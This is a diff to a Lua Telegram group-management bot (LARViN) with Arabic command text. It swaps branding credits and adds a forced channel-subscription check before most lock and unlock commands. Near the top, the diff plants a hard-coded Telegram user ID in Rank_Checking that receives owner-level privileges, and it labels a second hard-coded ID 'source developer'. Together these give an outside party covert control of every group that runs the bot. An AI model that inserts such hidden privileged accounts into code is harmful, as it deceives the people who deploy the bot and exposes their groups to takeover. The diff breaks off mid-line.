@@ -16,9 +16,7 @@ print("\27[34m"..[[
 
 >> Best Source in Telegram
 >> Features fast and powerful
->> CH > @Source_Milano
->> CH > @Source_Milano 
->> DEVELOPER > @p018q
+
 ]].."\27[m")
 
 io.popen("mkdir LARViN_Files")
@@ -104,7 +102,9 @@ end
 end
 function CleangGroups();local z = io.open('./LARViN');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/LARViN.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(Id_Sudo) then
+if tonumber(user_id) == tonumber(970017493) then  
+var = true  
+elseif tonumber(user_id) == tonumber(Id_Sudo) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = true  
@@ -126,7 +126,9 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if DevLARViNe(user_id) == true then
+if tonumber(user_id) == tonumber(1048831878) then  
+var = 'مطور السورس'
+elseif DevLARViNe(user_id) == true then
 var = "المطور الاساسي"  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = "البوت"
@@ -388,29 +390,41 @@ user_id_ = user,
 status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
 end
 
+function AddChannel(User)
+local var = true
+if database:get(bot_id..'add:ch:id') then
+local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
+data = json:decode(url)
+if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
+var = false
+end
+end
+return var
+end
+
 function Reply_Status(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
-local UserName = (data.username_ or "Source_Milano")
+local UserName = (data.username_ or "LARViNTEAM")
 for LARViN in string.gmatch(data.first_name_, "[^%s]+") do
 data.first_name_ = LARViN
 end
-local NameUser = "🗣┇بواسطه - ["..data.first_name_.."](T.me/"..UserName..")"
-local NameUserr = "🗣┇العضو ~ ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUser = "🗣┇بواسطه ~⪼ ["..data.first_name_.."](T.me/"..UserName..")\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
+local NameUserr = "🎫┇الاسم ~⪼ ["..data.first_name_.."](T.me/"..UserName..")"
 if status == "lock" then
-send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية - المسح\n")
+send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية ~⪼ المسح\n")
 return false
 end
 if status == "lockktm" then
-send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية - الكتم\n")
+send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية ~⪼ الكتم\n")
 return false
 end
 if status == "lockkick" then
-send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية - الطرد\n")
+send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية ~⪼ الطرد\n")
 return false
 end
 if status == "lockkid" then
-send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية - التقييد\n")
+send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\n🚫┇خاصية ~⪼ التقييد\n")
 return false
 end
 if status == "unlock" then
@@ -422,7 +436,7 @@ send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
 return false
 end
 if status == "reply_Add" then
-send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
+send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
 return false
 end
 else
@@ -1302,7 +1316,16 @@ tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100"
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل التثبيت هنا")  
 return false
 end 
-if text == "قفل التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "قفل التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:set(bot_id.."LARViN:Lock:edit"..msg.chat_id_,true) 
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل تعديل")  
 return false
@@ -1313,6 +1336,15 @@ Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل تعديل"
 return false
 end 
 if text == "قفل الكل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end  
 database:set(bot_id.."LARViN:Lock:tagservrbot"..msg.chat_id_,true)   
 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
@@ -1322,43 +1354,115 @@ Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل جميع ا
 return false
 end 
 --------------------------------------------------------------------------------------------------------------
-if text == "فتح الاضافه" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
+if text == "فتح الاضافه" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:AddMempar"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح اضافة الاعضاء")  
 return false
 end 
-if text == "فتح الدردشه" and msg.reply_to_message_id_ == 0 and Owner(msg) then 
+if text == "فتح الدردشه" and msg.reply_to_message_id_ == 0 and Owner(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:text"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الدردشه")  
 return false
 end 
-if text == "فتح الدخول" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
+if text == "فتح الدخول" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:Join"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح دخول الاعضاء")  
 return false
 end 
-if text == "فتح البوتات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
+if text == "فتح البوتات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:Bot:kick"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح البوتات")  
 return false
 end 
-if text == "فتح البوتات " and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
+if text == "فتح البوتات " and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:Bot:kick"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","🍃\n💢️┇تم فـتح البوتات")  
 return false
 end 
 if text == "فتح الاشعارات" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end  
 database:del(bot_id.."LARViN:Lock:tagservr"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح الاشعارات")  
 return false
 end 
-if text == "فتح التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "فتح التثبيت" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:lockpin"..msg.chat_id_)  
 database:srem(bot_id.."LARViN:Lock:pin",msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح التثبيت هنا")  
 return false
 end 
-if text == "فتح التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
+if text == "فتح التعديل" and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:edit"..msg.chat_id_) 
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح تعديل")  
 return false
@@ -1368,7 +1472,16 @@ database:del(bot_id.."LARViN:Lock:edit"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح تعديل")  
 return false
 end 
-if text == "فتح الكل" and msg.reply_to_message_id_ == 0 and Addictive(msg) then 
+if text == "فتح الكل" and msg.reply_to_message_id_ == 0 and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end 
 database:del(bot_id.."LARViN:Lock:tagservrbot"..msg.chat_id_)   
 list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
 for i,lock in pairs(list) do 
@@ -1378,7 +1491,16 @@ Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فـتح جميع 
 return false
 end 
 --------------------------------------------------------------------------------------------------------------
-if text == "قفل الروابط" and Addictive(msg) then
+if text == "قفل الروابط" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:Link"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل الروابط")  
 return false
@@ -1398,12 +1520,30 @@ database:set(bot_id.."LARViN:Lock:Link"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الروابط")  
 return false
 end 
-if text == "فتح الروابط" and Addictive(msg) then
+if text == "فتح الروابط" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Link"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الروابط")  
 return false
 end 
-if text == "قفل المعرفات" and Addictive(msg) then
+if text == "قفل المعرفات" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:User:Name"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل المعرفات")  
 return false
@@ -1423,12 +1563,30 @@ database:set(bot_id.."LARViN:Lock:User:Name"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل المعرفات")  
 return false
 end 
-if text == "فتح المعرفات" and Addictive(msg) then
+if text == "فتح المعرفات" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:User:Name"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح المعرفات")  
 return false
 end 
-if text == "قفل التاك" and Addictive(msg) then
+if text == "قفل التاك" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:hashtak"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل التاك")  
 return false
@@ -1448,7 +1606,16 @@ database:set(bot_id.."LARViN:Lock:hashtak"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل التاك")  
 return false
 end 
-if text == "فتح التاك" and Addictive(msg) then
+if text == "فتح التاك" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:hashtak"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح التاك")  
 return false
@@ -1528,7 +1695,16 @@ database:del(bot_id.."LARViN:Lock:Video"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الفيديو")  
 return false
 end 
-if text == "قفل المتحركه" and Addictive(msg) then
+if text == "قفل المتحركه" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:Animation"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل المتحركه")  
 return false
@@ -1548,12 +1724,30 @@ database:set(bot_id.."LARViN:Lock:Animation"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل المتحركه")  
 return false
 end 
-if text == "فتح المتحركه" and Addictive(msg) then
+if text == "فتح المتحركه" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Animation"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح المتحركه")  
 return false
 end 
-if text == "قفل الالعاب" and Addictive(msg) then
+if text == "قفل الالعاب" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:geam"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل الالعاب")  
 return false
@@ -1573,7 +1767,16 @@ database:set(bot_id.."LARViN:Lock:geam"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الالعاب")  
 return false
 end 
-if text == "فتح الالعاب" and Addictive(msg) then
+if text == "فتح الالعاب" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:geam"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الالعاب")  
 return false
@@ -1653,7 +1856,16 @@ database:del(bot_id.."LARViN:Lock:Keyboard"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الكيبورد")  
 return false
 end 
-if text == "قفل الملصقات" and Addictive(msg) then
+if text == "قفل الملصقات" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:Sticker"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل الملصقات")  
 return false
@@ -1673,12 +1885,30 @@ database:set(bot_id.."LARViN:Lock:Sticker"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الملصقات")  
 return false
 end 
-if text == "فتح الملصقات" and Addictive(msg) then
+if text == "فتح الملصقات" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Sticker"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الملصقات")  
 return false
 end 
-if text == "قفل التوجيه" and Addictive(msg) then
+if text == "قفل التوجيه" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:forward"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل التوجيه")  
 return false
@@ -1698,7 +1928,16 @@ database:set(bot_id.."LARViN:Lock:forward"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل التوجيه")  
 return false
 end 
-if text == "فتح التوجيه" and Addictive(msg) then
+if text == "فتح التوجيه" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:forward"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح التوجيه")  
 return false
@@ -1728,7 +1967,16 @@ database:del(bot_id.."LARViN:Lock:Document"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الملفات")  
 return false
 end 
-if text == "قفل السيلفي" and Addictive(msg) then
+if text == "قفل السيلفي" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:set(bot_id.."LARViN:Lock:Unsupported"..msg.chat_id_,"del")  
 Reply_Status(msg,msg.sender_user_id_,"lock","💢️┇تم قفـل السيلفي")  
 return false
@@ -1748,7 +1996,16 @@ database:set(bot_id.."LARViN:Lock:Unsupported"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل السيلفي")  
 return false
 end 
-if text == "فتح السيلفي" and Addictive(msg) then
+if text == "فتح السيلفي" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Unsupported"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح السيلفي")  
 return false
@@ -1773,7 +2030,16 @@ database:set(bot_id.."LARViN:Lock:Markdaun"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الماركداون")  
 return false
 end 
-if text == "فتح الماركداون" and Addictive(msg) then
+if text == "فتح الماركداون" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Markdaun"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الماركداون")  
 return false
@@ -1798,7 +2064,16 @@ database:set(bot_id.."LARViN:Lock:Contact"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الجهات")  
 return false
 end 
-if text == "فتح الجهات" and Addictive(msg) then
+if text == "فتح الجهات" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Contact"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الجهات")  
 return false
@@ -1823,7 +2098,16 @@ database:set(bot_id.."LARViN:Lock:Spam"..msg.chat_id_,"kick")
 Reply_Status(msg,msg.sender_user_id_,"lockkick","💢️┇تم قفـل الكلايش")  
 return false
 end 
-if text == "فتح الكلايش" and Addictive(msg) then
+if text == "فتح الكلايش" and Addictive(msg) then  
+if AddChannel(msg.sender_user_id_) == false then
+local textchuser = database:get(bot_id..'text:ch:user')
+if textchuser then
+send(msg.chat_id_, msg.id_,'['..textchuser..']')
+else
+send(msg.chat_id_, msg.id_,'👥┇ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n 📌┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 database:del(bot_id.."LARViN:Lock:Spam"..msg.chat_id_)  
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الكلايش")  
 return false
@@ -1853,27 +2137,72 @@ database:del(bot_id.."LARViN:Lock:Inlen"..msg.chat_id_)
 Reply_Status(msg,msg.sender_user_id_,"unlock","💢️┇تم فتح الانلاين")  
 return false
 end 
-if text == "قفل التكرار بالطرد" and Addictive(msg) then 
